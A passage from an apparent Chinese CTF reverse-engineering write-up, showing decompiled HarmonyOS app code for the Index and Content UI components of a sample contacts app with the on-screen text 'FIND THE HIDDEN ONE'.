class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p001entry/src/main/ets/pages;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: &amp;entry/src/main/ets/pages/Index&amp;, reason: invalid class name */</span></span><br><span class="line"><span class="comment">/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Index</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object pkgName<span class="meta">@entry</span>;</span><br><span class="line">    <span class="keyword">public</span> Object isCommonjs;</span><br><span class="line">    <span class="keyword">public</span> Object hasTopLevelAwait;</span><br><span class="line">    <span class="keyword">public</span> Object isSharedModule;</span><br><span class="line">    <span class="keyword">public</span> Object scopeNames;</span><br><span class="line">    <span class="keyword">public</span> Object moduleRecordIdx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #*#(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v0, types: [java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #*#^<span class="number">1</span>(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> _lexenv_0_0_(<span class="literal">null</span>, createemptyobject());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#(Object functionObject, Object newTarget, Index <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        obj = Stack.create;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;alignContent&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj2.alignContent = Alignment.Top;</span><br><span class="line">        obj(obj2);</span><br><span class="line">        Stack.width(<span class="keyword">import</span> &#123; StyleConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/StyleConstants&amp;&quot;</span>.FULL_WIDTH);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r16v0, types: [&amp;entry/src/main/ets/pages/Index&amp;] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r23v34, types: [int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>=#Index(Object functionObject, Object newTarget, Index <span class="built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;</span><br><span class="line">        obj = arg3;</span><br><span class="line">        obj2 = arg4;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj2 ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj2 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3 = <span class="built_in">super</span>(arg0, arg2, obj, arg5);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="string">&quot;function&quot;</span> == typeof(obj2) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj3.paramsGenerator_ = obj2;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3.setInitiallyProvidedValue(arg1);</span><br><span class="line">        obj3.finalizeConstruction();</span><br><span class="line">        <span class="keyword">return</span> obj3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r21v10, types: [Object, java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>(Object functionObject, Object newTarget, Index <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isfalse(arg1) != <span class="literal">null</span>) &#123;</span><br><span class="line">            ldlexvar = _lexenv_0_1_;</span><br><span class="line">            ldlexvar.updateStateVarsOfChildByElmtId(arg0, createemptyobject());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        newobjrange = <span class="keyword">import</span> &#123; Header &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/components/Header&amp;&quot;</span>(_lexenv_0_1_, createemptyobject(), <span class="literal">null</span>, arg0, #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">1</span>*#, createobjectwithbuffer([<span class="string">&quot;page&quot;</span>, <span class="string">&quot;entry/src/main/ets/pages/Index.ets&quot;</span>, <span class="string">&quot;line&quot;</span>, <span class="number">28</span>, <span class="string">&quot;col&quot;</span>, <span class="number">7</span>]));</span><br><span class="line">        ViewPU.create(newobjrange);</span><br><span class="line">        newobjrange.paramsGenerator_ = #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">1</span>*#paramsLambda;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r21v10, types: [Object, java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>(Object functionObject, Object newTarget, Index <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isfalse(arg1) != <span class="literal">null</span>) &#123;</span><br><span class="line">            ldlexvar = _lexenv_0_1_;</span><br><span class="line">            ldlexvar.updateStateVarsOfChildByElmtId(arg0, createemptyobject());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        newobjrange = <span class="keyword">import</span> &#123; Content &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/components/Content&amp;&quot;</span>(_lexenv_0_1_, createemptyobject(), <span class="literal">null</span>, arg0, #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">2</span>*#, createobjectwithbuffer([<span class="string">&quot;page&quot;</span>, <span class="string">&quot;entry/src/main/ets/pages/Index.ets&quot;</span>, <span class="string">&quot;line&quot;</span>, <span class="number">29</span>, <span class="string">&quot;col&quot;</span>, <span class="number">7</span>]));</span><br><span class="line">        ViewPU.create(newobjrange);</span><br><span class="line">        newobjrange.paramsGenerator_ = #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">2</span>*#paramsLambda;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r13v7, types: [boolean, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">func_main_0</span><span class="params">(Object functionObject, Object newTarget, Index <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">3</span>, <span class="string">&quot;Index&quot;</span>, <span class="number">0</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">1</span>, <span class="string">&quot;this&quot;</span>, <span class="number">2</span>], <span class="number">3</span>);</span><br><span class="line">        _lexenv_0_1_ = newTarget;</span><br><span class="line">        _lexenv_0_2_ = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (isIn(<span class="string">&quot;finalizeConstruction&quot;</span>, ViewPU.prototype) == <span class="literal">false</span>) &#123;</span><br><span class="line">            Reflect.set(ViewPU.prototype, <span class="string">&quot;finalizeConstruction&quot;</span>, #*#);</span><br><span class="line">        &#125;</span><br><span class="line">        obj = ViewPU.#~@<span class="number">0</span>=#Index(Object2, Object3, ViewPU, [<span class="string">&quot;setInitiallyProvidedValue&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/Index&amp;.#~@0&gt;#setInitiallyProvidedValue&quot;</span>, <span class="number">1</span>, <span class="string">&quot;updateStateVars&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/Index&amp;.#~@0&gt;#updateStateVars&quot;</span>, <span class="number">1</span>, <span class="string">&quot;purgeVariableDependenciesOnElmtId&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/Index&amp;.#~@0&gt;#purgeVariableDependenciesOnElmtId&quot;</span>, <span class="number">1</span>, <span class="string">&quot;aboutToBeDeleted&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/Index&amp;.#~@0&gt;#aboutToBeDeleted&quot;</span>, <span class="number">0</span>, <span class="string">&quot;initialRender&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/Index&amp;.#~@0&gt;#initialRender&quot;</span>, <span class="number">0</span>, <span class="string">&quot;rerender&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/Index&amp;.#~@0&gt;#rerender&quot;</span>, <span class="number">0</span>, <span class="string">&quot;getEntryName&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/Index&amp;.#~@0&lt;#getEntryName&quot;</span>, <span class="number">0</span>, <span class="number">6</span>]);</span><br><span class="line">        obj2 = obj.prototype;</span><br><span class="line">        _lexenv_0_0_ = obj;</span><br><span class="line">        registerNamedRoute(#*#^<span class="number">1</span>, <span class="string">&quot;&quot;</span>, createobjectwithbuffer([<span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>, <span class="string">&quot;pagePath&quot;</span>, <span class="string">&quot;pages/Index&quot;</span>, <span class="string">&quot;pageFullPath&quot;</span>, <span class="string">&quot;entry/src/main/ets/pages/Index&quot;</span>, <span class="string">&quot;integratedHsp&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;moduleType&quot;</span>, <span class="string">&quot;followWithHap&quot;</span>]));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">1</span>*#(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">2</span>*#(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#rerender(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.updateDirtyElements();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&lt;#getEntryName(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#initialRender(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        ldlexvar = _lexenv_0_1_;</span><br><span class="line">        ldlexvar.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#, Stack);</span><br><span class="line">        ldlexvar2 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar2.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>, createobjectwithbuffer([<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Header&quot;</span>]));</span><br><span class="line">        ldlexvar3 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar3.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>, createobjectwithbuffer([<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Content&quot;</span>]));</span><br><span class="line">        Stack.pop();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#updateStateVars(Object functionObject, Object newTarget, Index <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#aboutToBeDeleted(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        Get = SubscriberManager.Get();</span><br><span class="line">        Get.delete(<span class="built_in">this</span>.id__());</span><br><span class="line">        <span class="built_in">this</span>.aboutToBeDeletedInternal();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">1</span>*#paramsLambda(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> createemptyobject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">2</span>*#paramsLambda(Object functionObject, Object newTarget, Index <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> createemptyobject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#setInitiallyProvidedValue(Object functionObject, Object newTarget, Index <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, Index <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是导入了两个组件<code>Content</code>和<code>header</code>，接下来看这两个组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p001entry/src/main/ets/components;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: &amp;entry/src/main/ets/components/Content&amp;, reason: invalid class name */</span></span><br><span class="line"><span class="comment">/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Content</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object pkgName<span class="meta">@entry</span>;</span><br><span class="line">    <span class="keyword">public</span> Object isCommonjs;</span><br><span class="line">    <span class="keyword">public</span> Object hasTopLevelAwait;</span><br><span class="line">    <span class="keyword">public</span> Object isSharedModule;</span><br><span class="line">    <span class="keyword">public</span> Object scopeNames;</span><br><span class="line">    <span class="keyword">public</span> Object moduleRecordIdx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #*#(Object functionObject, Object newTarget, Content <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#(Object functionObject, Object newTarget, Content <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Column.create();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>(Object functionObject, Object newTarget, Content <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        GridRow.create();</span><br><span class="line">        GridRow.height(<span class="keyword">import</span> &#123; StyleConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/StyleConstants&amp;&quot;</span>.FULL_HEIGHT);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>(Object functionObject, Object newTarget, Content <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        obj = GridCol.create;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;span&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj3 = createobjectwithbuffer([<span class="string">&quot;sm&quot;</span>, <span class="number">0</span>, <span class="string">&quot;md&quot;</span>, <span class="number">0</span>, <span class="string">&quot;lg&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj3.sm = <span class="keyword">import</span> &#123; GridConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/GridConstants&amp;&quot;</span>.SPAN_TWELVE;</span><br><span class="line">        obj3.md = <span class="keyword">import</span> &#123; GridConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/GridConstants&amp;&quot;</span>.SPAN_SIX;</span><br><span class="line">        obj3.lg = <span class="keyword">import</span> &#123; GridConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/GridConstants&amp;&quot;</span>.SPAN_EIGHT;</span><br><span class="line">        obj2.span = obj3;</span><br><span class="line">        obj(obj2);</span><br><span class="line">        obj4 = GridCol.borderRadius;</span><br><span class="line">        obj5 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777317</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj5.params = [Object];</span><br><span class="line">        obj4(obj5);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r21v10, types: [Object, java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">3</span>(Object functionObject, Object newTarget, Content <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isfalse(arg1) != <span class="literal">null</span>) &#123;</span><br><span class="line">            ldlexvar = _lexenv_0_1_;</span><br><span class="line">            ldlexvar.updateStateVarsOfChildByElmtId(arg0, createemptyobject());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        newobjrange = <span class="keyword">import</span> &#123; UserList &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/components/UserList&amp;&quot;</span>(_lexenv_0_1_, createemptyobject(), <span class="literal">null</span>, arg0, #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">3</span>*#, createobjectwithbuffer([<span class="string">&quot;page&quot;</span>, <span class="string">&quot;entry/src/main/ets/components/Content.ets&quot;</span>, <span class="string">&quot;line&quot;</span>, <span class="number">15</span>, <span class="string">&quot;col&quot;</span>, <span class="number">11</span>]));</span><br><span class="line">        ViewPU.create(newobjrange);</span><br><span class="line">        newobjrange.paramsGenerator_ = #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">3</span>*#paramsLambda;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">4</span>(Object functionObject, Object newTarget, Content <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Text.create(<span class="string">&quot;FIND THE HIDDEN ONE&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r13v7, types: [boolean, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">func_main_0</span><span class="params">(Object functionObject, Object newTarget, Content <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (isIn(<span class="string">&quot;finalizeConstruction&quot;</span>, ViewPU.prototype) == <span class="literal">false</span>) &#123;</span><br><span class="line">            Reflect.set(ViewPU.prototype, <span class="string">&quot;finalizeConstruction&quot;</span>, #*#);</span><br><span class="line">        &#125;</span><br><span class="line">        obj = ViewPU.#~@<span class="number">0</span>=#Content(Object2, Object3, ViewPU, [<span class="string">&quot;setInitiallyProvidedValue&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Content&amp;.#~@0&gt;#setInitiallyProvidedValue&quot;</span>, <span class="number">1</span>, <span class="string">&quot;updateStateVars&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Content&amp;.#~@0&gt;#updateStateVars&quot;</span>, <span class="number">1</span>, <span class="string">&quot;purgeVariableDependenciesOnElmtId&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Content&amp;.#~@0&gt;#purgeVariableDependenciesOnElmtId&quot;</span>, <span class="number">1</span>, <span class="string">&quot;aboutToBeDeleted&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Content&amp;.#~@0&gt;#aboutToBeDeleted&quot;</span>, <span class="number">0</span>, <span class="string">&quot;initialRender&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Content&amp;.#~@0&gt;#initialRender&quot;</span>, <span class="number">0</span>, <span class="string">&quot;rerender&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/components/Content&amp;.#~@0&gt;#rerender&quot;</span>, <span class="number">0</span>, <span class="number">6</span>]);</span><br><span class="line">        obj2 = obj.prototype;</span><br><span class="line">        _module_0_ = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*^<span class="number">3</span>*#(Object functionObject, Object newTarget, Content <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span 